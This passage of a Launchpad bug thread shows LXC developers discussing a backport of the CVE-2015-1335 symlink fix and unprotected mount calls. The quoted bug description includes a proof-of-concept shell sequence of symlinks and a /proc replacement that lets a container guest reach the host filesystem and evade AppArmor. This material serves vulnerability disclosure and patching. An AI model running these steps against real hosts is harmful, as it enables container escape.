  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Serge,</p>
<p>sorry for getting back to this so late.</p>
<p>On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:</p>
<p><span class="foldable-quoted">&gt; Quoting Mike Gabriel (&lt;email address hidden&gt;):
</span></p>
<p><span class="foldable-quoted">&gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC<br />
&gt;&gt; 0.7.x (as found in Debian squeeze-lts).<br />
&gt;&gt;<br />
&gt;&gt; The patch is attached, I am still in the testing-<wbr />for-regressions phase.<br />
&gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is<br />
&gt;&gt; suitable for Ubuntu 12.04, as well?<br />
&gt;<br />
&gt; Hi,<br />
&gt;<br />
&gt; So the thing to look for is any unconverted &quot;mount&quot; calls.  It<br />
&gt; looks like the lxc_setup_fs() calls to mount_fs() are not being<br />
&gt; protected.  So the contianer admin could attack through a /proc<br />
&gt; symlink.
</span></p>
<p>Hmmm... ok...</p>
<p>I just checked upstream Git and the location you refer to is not using<br />
safe_mount either there [1]</p>
<p>Furthermore, it seems non-trivial to inform safe_mount about the root<br />
path from within lxc_init.c.</p>
<p>Do you have any input on the following questions?:</p>
<p>&nbsp;&nbsp;&nbsp;o Why mount_fs() in latest HEAD still using the mount() call<br />
instead of safe_mount()?<br />
&nbsp;&nbsp;&nbsp;o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?</p>
<p>Thanks for any input.</p>
<p>Mike</p>
<p>[1] <a rel="nofollow" href="https://github.com/lxc/lxc/blob/master/src/lxc/initutils.c#L35">https:/<wbr />/github.<wbr />com/lxc/<wbr />lxc/blob/<wbr />master/<wbr />src/lxc/<wbr />initutils.<wbr />c#L35</a><br />
--</p>
<p>DAS-NETZWERKTEAM<br />
mike gabriel, herweg 7, 24357 fleckeby<br />
fon: +49 (1520) 1976 148</p>
<p>GnuPG Key ID 0x25771B31<br />
mail: &lt;email address hidden&gt;, <a rel="nofollow" href="http://das-netzwerkteam.de">http://<wbr />das-netzwerktea<wbr />m.de</a></p>
<p>freeBusy:<br />
<a rel="nofollow" href="https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de">https:/<wbr />/mail.das-<wbr />netzwerkteam.<wbr />de/mailxchange/<wbr />kronolith/<wbr />fb.php?<wbr />u=m.gabriel%<wbr />40das-netzwerkt<wbr />eam.de</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Serge,

sorry for getting back to this so late.

On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:

&gt; Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):

&gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC
&gt;&gt; 0.7.x (as found in Debian squeeze-lts).
&gt;&gt;
&gt;&gt; The patch is attached, I am still in the testing-for-regressions phase.
&gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is
&gt;&gt; suitable for Ubuntu 12.04, as well?
&gt;
&gt; Hi,
&gt;
&gt; So the thing to look for is any unconverted "mount" calls.  It
&gt; looks like the lxc_setup_fs() calls to mount_fs() are not being
&gt; protected.  So the contianer admin could attack through a /proc
&gt; symlink.

Hmmm... ok...

I just checked upstream Git and the location you refer to is not using  
safe_mount either there [1]

Furthermore, it seems non-trivial to inform safe_mount about the root  
path from within lxc_init.c.

Do you have any input on the following questions?:

   o Why mount_fs() in latest HEAD still using the mount() call  
instead of safe_mount()?
   o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?

Thanks for any input.

Mike

[1] https://github.com/lxc/lxc/blob/master/src/lxc/initutils.c#L35
-- 

DAS-NETZWERKTEAM
mike gabriel, herweg 7, 24357 fleckeby
fon: +49 (1520) 1976 148

GnuPG Key ID 0x25771B31
mail: mike.gabriel@das-netzwerkteam.de, http://das-netzwerkteam.de

freeBusy:
https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/78" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-01-04T20:26:05+00:00" title="2016-01-04 20:26:05 UTC">on 2016-01-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/78"> #78</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/comments/78/+download">Download full text</a> (3.6 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Mike Gabriel (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; Hi Serge,<br />
&gt;<br />
&gt; sorry for getting back to this so late.<br />
&gt;<br />
&gt; On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:<br />
&gt;<br />
&gt; &gt; Quoting Mike Gabriel (&lt;email address hidden&gt;):<br />
&gt;<br />
&gt; &gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC<br />
&gt; &gt;&gt; 0.7.x (as found in Debian squeeze-lts).<br />
&gt; &gt;&gt;<br />
&gt; &gt;&gt; The patch is attached, I am still in the testing-<wbr />for-regressions phase.<br />
&gt; &gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is<br />
&gt; &gt;&gt; suitable for Ubuntu 12.04, as well?<br />
&gt; &gt;<br />
&gt; &gt; Hi,<br />
&gt; &gt;<br />
&gt; &gt; So the thing to look for is any unconverted &quot;mount&quot; calls.  It<br />
&gt; &gt; looks like the lxc_setup_fs() calls to mount_fs() are not being<br />
&gt; &gt; protected.  So the contianer admin could attack through a /proc<br />
&gt; &gt; symlink.<br />
&gt;<br />
&gt; Hmmm... ok...<br />
&gt;<br />
&gt; I just checked upstream Git and the location you refer to is not using<br />
&gt; safe_mount either there [1]
</span></p>
<p>Huh, that&#x27;s odd.  Yes those should be protected, since /proc etc in<br />
the container could be symlinks.  Do you mind sending a patch?</p>
<p><span class="foldable-quoted">&gt; Furthermore, it seems non-trivial to inform safe_mount about the root<br />
&gt; path from within lxc_init.c.<br />
&gt;<br />
&gt; Do you have any input on the following questions?:<br />
&gt;<br />
&gt;    o Why mount_fs() in latest HEAD still using the mount() call<br />
&gt; instead of safe_mount()?<br />
&gt;    o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?
</span></p>
<p>You shouldn&#x27;t need to - it&#x27;s just &#x27;/&#x27; because you&#x27;re already chrooted<br />
there.</p>
<p><span class="foldable-quoted">&gt; Thanks for any input.<br />
&gt;<br />
&gt; Mike<br />
&gt;<br />
&gt; [1] <a rel="nofollow" href="https://github.com/lxc/lxc/blob/master/src/lxc/initutils.c#L35">https:/<wbr />/github.<wbr />com/lxc/<wbr />lxc/blob/<wbr />master/<wbr />src/lxc/<wbr />initutils.<wbr />c#L35</a><br />
&gt; --<br />
&gt;<br />
&gt; DAS-NETZWERKTEAM<br />
&gt; mike gabriel, herweg 7, 24357 fleckeby<br />
&gt; fon: +49 (1520) 1976 148<br />
&gt;<br />
&gt; GnuPG Key ID 0x25771B31<br />
&gt; mail: &lt;email address hidden&gt;, <a rel="nofollow" href="http://das-netzwerkteam.de">http://<wbr />das-netzwerktea<wbr />m.de</a><br />
&gt;<br />
&gt; freeBusy:<br />
&gt; <a rel="nofollow" href="https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de">https:/<wbr />/mail.das-<wbr />netzwerkteam.<wbr />de/mailxchange/<wbr />kronolith/<wbr />fb.php?<wbr />u=m.gabriel%<wbr />40das-netzwerkt<wbr />eam.de</a><br />
&gt;<br />
&gt; --<br />
&gt; You received this bug notification because you are subscribed to the bug<br />
&gt; report.<br />
&gt; Matching subscriptions: lxc<br />
&gt; <a rel="nofollow" href="https://bugs.launchpad.net/bugs/1476662">https:/<wbr />/bugs.launchpad<wbr />.net/bugs/<wbr />1476662</a><br />
&gt;<br />
&gt; Title:<br />
&gt;   lxc-start symlink vulnerabilities may allow guest to read host<br />
&gt;   filesystem, interfere with apparmor<br />
&gt;<br />
&gt; Status in lxc package in Ubuntu:<br />
&gt;   Fix Released<br />
&gt;<br />
&gt; Bug description:<br />
&gt;   lxc-start shuffles around mounts using helper directory<br />
&gt;   /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc (guest root fs is mounted here)<br />
&gt;<br />
&gt;   It then modifies mounts operating in guest root directory before<br />
&gt;   invoking init. As it does not check if all mount points are<br />
&gt;   directories, a malicious guest may modify its internal structure<br />
&gt;   before shutdown (or was created using manipulated image) and then when<br />
&gt;   started again, guest may<br />
&gt;<br />
&gt;   * Access  the whole host root filesystem<br />
&gt;<br />
&gt;   * Block switching from lxc-start apparmor profile to lxc-container-<br />
&gt;   default<br />
&gt;<br />
&gt;<br />
&gt;   # Real putold before pivot-root (root fs will end here)<br />
&gt;   mkdir -p /x/lxc_putold<br />
&gt;<br />
&gt;   # Faked putold<br />
&gt;   ln -s /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold lxc_putold<br />
&gt;   mkdir -p /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc<br />
&gt;   touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc/mounts<br />
&gt;<br />
&gt;<br />
&gt;   # proc fake<br />
&gt;   mkdir -p /x/proc<br />
&gt;   umount /proc<br />
&gt;   rmdir /proc<br />
&gt;  ...
</span></p></div>
    
    <p>
      <a href="/ubuntu/+source/lxc/+bug/1476662/comments/78">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):
&gt; Hi Serge,
&gt; 
&gt; sorry for getting back to this so late.
&gt; 
&gt; On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:
&gt; 
&gt; &gt; Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):
&gt; 
&gt; &gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC
&gt; &gt;&gt; 0.7.x (as found in Debian squeeze-lts).
&gt; &gt;&gt;
&gt; &gt;&gt; The patch is attached, I am still in the testing-for-regressions phase.
&gt; &gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is
&gt; &gt;&gt; suitable for Ubuntu 12.04, as well?
&gt; &gt;
&gt; &gt; Hi,
&gt; &gt;
&gt; &gt; So the thing to look for is any unconverted "mount" calls.  It
&gt; &gt; looks like the lxc_setup_fs() calls to mount_fs() are not being
&gt; &gt; protected.  So the contianer admin could attack through a /proc
&gt; &gt; symlink.
&gt; 
&gt; Hmmm... ok...
&gt; 
&gt; I just checked upstream Git and the location you refer to is not using  
&gt; safe_mount either there [1]

Huh, that's odd.  Yes those should be protected, since /proc etc in
the container could be symlinks.  Do you mind sending a patch?

&gt; Furthermore, it seems non-trivial to inform safe_mount about the root  
&gt; path from within lxc_init.c.
&gt; 
&gt; Do you have any input on the following questions?:
&gt; 
&gt;    o Why mount_fs() in latest HEAD still using the mount() call  
&gt; instead of safe_mount()?
&gt;    o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?

You shouldn't need to - it's just '/' because you're already chrooted
there.

&gt; Thanks for any input.
&gt; 
&gt; Mike
&gt; 
&gt; [1] https://github.com/lxc/lxc/blob/master/src/lxc/initutils.c#L35
&gt; -- 
&gt; 
&gt; DAS-NETZWERKTEAM
&gt; mike gabriel, herweg 7, 24357 fleckeby
&gt; fon: +49 (1520) 1976 148
&gt; 
&gt; GnuPG Key ID 0x25771B31
&gt; mail: mike.gabriel@das-netzwerkteam.de, http://das-netzwerkteam.de
&gt; 
&gt; freeBusy:
&gt; https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de
&gt; 
&gt; -- 
&gt; You received this bug notification because you are subscribed to the bug
&gt; report.
&gt; Matching subscriptions: lxc
&gt; https://bugs.launchpad.net/bugs/1476662
&gt; 
&gt; Title:
&gt;   lxc-start symlink vulnerabilities may allow guest to read host
&gt;   filesystem, interfere with apparmor
&gt; 
&gt; Status in lxc package in Ubuntu:
&gt;   Fix Released
&gt; 
&gt; Bug description:
&gt;   lxc-start shuffles around mounts using helper directory
&gt;   /usr/lib/x86_64-linux-gnu/lxc (guest root fs is mounted here)
&gt; 
&gt;   It then modifies mounts operating in guest root directory before
&gt;   invoking init. As it does not check if all mount points are
&gt;   directories, a malicious guest may modify its internal structure
&gt;   before shutdown (or was created using manipulated image) and then when
&gt;   started again, guest may
&gt; 
&gt;   * Access  the whole host root filesystem
&gt; 
&gt;   * Block switching from lxc-start apparmor profile to lxc-container-
&gt;   default
&gt; 
&gt;   
&gt;   # Real putold before pivot-root (root fs will end here)
&gt;   mkdir -p /x/lxc_putold
&gt; 
&gt;   # Faked putold
&gt;   ln -s /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold lxc_putold
&gt;   mkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/lxc_putold/proc/mounts
&gt; 
&gt;   
&gt;   # proc fake
&gt;   mkdir -p /x/proc
&gt;   umount /proc
&gt;   rmdir /proc
&gt;   ln -s /usr/lib/x86_64-linux-gnu/lxc/x/proc proc
&gt; 
&gt;   mkdir -p /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr /usr/lib/x86_64-linux-gnu/lxc/x/proc/self
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/proc/1/attr/current
&gt;   touch /usr/lib/x86_64-linux-gnu/lxc/x/proc/self/status
&gt; 
&gt; 
&gt;   The  issue was also found during
&gt;   https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html
&gt; 
&gt; To manage notifications about this bug go to:
&gt; https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+subscriptions
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/79" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sunweaver" class="sprite person">Mike Gabriel (sunweaver)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-01-06T16:23:25+00:00" title="2016-01-06 16:23:25 UTC">on 2016-01-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/79"> #79</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Serge,</p>
<p>On  Mo 04 Jan 2016 21:26:05 CET, Serge Hallyn wrote:</p>
<p><span class="foldable-quoted">&gt; Quoting Mike Gabriel (&lt;email address hidden&gt;):<br />
&gt;&gt; Hi Serge,<br />
&gt;&gt;<br />
&gt;&gt; sorry for getting back to this so late.<br />
&gt;&gt;<br />
&gt;&gt; On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:<br />
&gt;&gt;<br />
&gt;&gt; &gt; Quoting Mike Gabriel (&lt;email address hidden&gt;):<br />
&gt;&gt;<br />
&gt;&gt; &gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC<br />
&gt;&gt; &gt;&gt; 0.7.x (as found in Debian squeeze-lts).<br />
&gt;&gt; &gt;&gt;<br />
&gt;&gt; &gt;&gt; The patch is attached, I am still in the testing-<wbr />for-regressions phase.<br />
&gt;&gt; &gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is<br />
&gt;&gt; &gt;&gt; suitable for Ubuntu 12.04, as well?<br />
&gt;&gt; &gt;<br />
&gt;&gt; &gt; Hi,<br />
&gt;&gt; &gt;<br />
&gt;&gt; &gt; So the thing to look for is any unconverted &quot;mount&quot; calls.  It<br />
&gt;&gt; &gt; looks like the lxc_setup_fs() calls to mount_fs() are not being<br />
&gt;&gt; &gt; protected.  So the contianer admin could attack through a /proc<br />
&gt;&gt; &gt; symlink.<br />
&gt;&gt;<br />
&gt;&gt; Hmmm... ok...<br />
&gt;&gt;<br />
&gt;&gt; I just checked upstream Git and the location you refer to is not using<br />
&gt;&gt; safe_mount either there [1]<br />
&gt;<br />
&gt; Huh, that&#x27;s odd.  Yes those should be protected, since /proc etc in<br />
&gt; the container could be symlinks.  Do you mind sending a patch?
</span></p>
<p>I will work on the squeeze-lts / precise patch first and test that. If<br />
that works well, I will forward-port the change to current HEAD.</p>
<p><span class="foldable-quoted">&gt;&gt; Furthermore, it seems non-trivial to inform safe_mount about the root<br />
&gt;&gt; path from within lxc_init.c.<br />
&gt;&gt;<br />
&gt;&gt; Do you have any input on the following questions?:<br />
&gt;&gt;<br />
&gt;&gt;    o Why mount_fs() in latest HEAD still using the mount() call<br />
&gt;&gt; instead of safe_mount()?<br />
&gt;&gt;    o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?<br />
&gt;<br />
&gt; You shouldn&#x27;t need to - it&#x27;s just &#x27;/&#x27; because you&#x27;re already chrooted<br />
&gt; there.<br />
&gt;
</span></p>
<p>Ok. That will make it very easy.</p>
<p>I get back to you with results within the month.</p>
<p>Mike<br />
--</p>
<p>DAS-NETZWERKTEAM<br />
mike gabriel, herweg 7, 24357 fleckeby<br />
fon: +49 (1520) 1976 148</p>
<p>GnuPG Key ID 0x25771B31<br />
mail: &lt;email address hidden&gt;, <a rel="nofollow" href="http://das-netzwerkteam.de">http://<wbr />das-netzwerktea<wbr />m.de</a></p>
<p>freeBusy:<br />
<a rel="nofollow" href="https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de">https:/<wbr />/mail.das-<wbr />netzwerkteam.<wbr />de/mailxchange/<wbr />kronolith/<wbr />fb.php?<wbr />u=m.gabriel%<wbr />40das-netzwerkt<wbr />eam.de</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Serge,

On  Mo 04 Jan 2016 21:26:05 CET, Serge Hallyn wrote:

&gt; Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):
&gt;&gt; Hi Serge,
&gt;&gt;
&gt;&gt; sorry for getting back to this so late.
&gt;&gt;
&gt;&gt; On  Di 08 Dez 2015 17:08:58 CET, Serge Hallyn wrote:
&gt;&gt;
&gt;&gt; &gt; Quoting Mike Gabriel (mike.gabriel@das-netzwerkteam.de):
&gt;&gt;
&gt;&gt; &gt;&gt; today I worked on backporting available fixes for CVE-2015-1335 to LXC
&gt;&gt; &gt;&gt; 0.7.x (as found in Debian squeeze-lts).
&gt;&gt; &gt;&gt;
&gt;&gt; &gt;&gt; The patch is attached, I am still in the testing-for-regressions phase.
&gt;&gt; &gt;&gt; Can any of the LXC devs take a look at the patch and maybe see if it is
&gt;&gt; &gt;&gt; suitable for Ubuntu 12.04, as well?
&gt;&gt; &gt;
&gt;&gt; &gt; Hi,
&gt;&gt; &gt;
&gt;&gt; &gt; So the thing to look for is any unconverted "mount" calls.  It
&gt;&gt; &gt; looks like the lxc_setup_fs() calls to mount_fs() are not being
&gt;&gt; &gt; protected.  So the contianer admin could attack through a /proc
&gt;&gt; &gt; symlink.
&gt;&gt;
&gt;&gt; Hmmm... ok...
&gt;&gt;
&gt;&gt; I just checked upstream Git and the location you refer to is not using
&gt;&gt; safe_mount either there [1]
&gt;
&gt; Huh, that's odd.  Yes those should be protected, since /proc etc in
&gt; the container could be symlinks.  Do you mind sending a patch?

I will work on the squeeze-lts / precise patch first and test that. If  
that works well, I will forward-port the change to current HEAD.

&gt;&gt; Furthermore, it seems non-trivial to inform safe_mount about the root
&gt;&gt; path from within lxc_init.c.
&gt;&gt;
&gt;&gt; Do you have any input on the following questions?:
&gt;&gt;
&gt;&gt;    o Why mount_fs() in latest HEAD still using the mount() call
&gt;&gt; instead of safe_mount()?
&gt;&gt;    o How could one pipe the rootfs path into lxc_setup_fs() -&gt; mount_fs()?
&gt;
&gt; You shouldn't need to - it's just '/' because you're already chrooted
&gt; there.
&gt;

Ok. That will make it very easy.

I get back to you with results within the month.

Mike
-- 

DAS-NETZWERKTEAM
mike gabriel, herweg 7, 24357 fleckeby
fon: +49 (1520) 1976 148

GnuPG Key ID 0x25771B31
mail: mike.gabriel@das-netzwerkteam.de, http://das-netzwerkteam.de

freeBusy:
https://mail.das-netzwerkteam.de/mailxchange/kronolith/fb.php?u=m.gabriel%40das-netzwerkteam.de
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/lxc/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/lxc/+bug/1476662/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/ubuntu/+source/lxc/+bug/1476662/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/lxc/+bug/1476662/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4433778/+files/0001-Prevent-mounting-onto-symlinks-inside-a-container.patch">Proposed patch to prevent lxc-start mounting onto symlinks</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4433778">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4438472/+files/0001-Prevent-mounting-onto-symlinks-inside-a-container.patch">0001-Prevent-mounting-onto-symlinks-inside-a-container.patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4438472">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4439977/+files/0001-Detect-when-mount-entry-targets-are-symbolic-links.patch">0001-Detect-when-mount-entry-targets-are-symbolic-links.patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4439977">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4441280/+files/0001-Detect-when-mount-entry-targets-are-symbolic-links.patch">Fixed version of the combined patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4441280">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456150/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.0</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456150">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456151/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.1</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456151">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456152/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against git HEAD</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456152">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4466529/+files/0001-Protect-container-mounts-against-symlinks.patch">NEW patch against upstream git HEAD</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4466529">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4467228/+files/0001-Protect-container-mounts-against-symlinks.patch">New patch against git HEAD</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4467228">edit</a>)
        </small>
      </li>
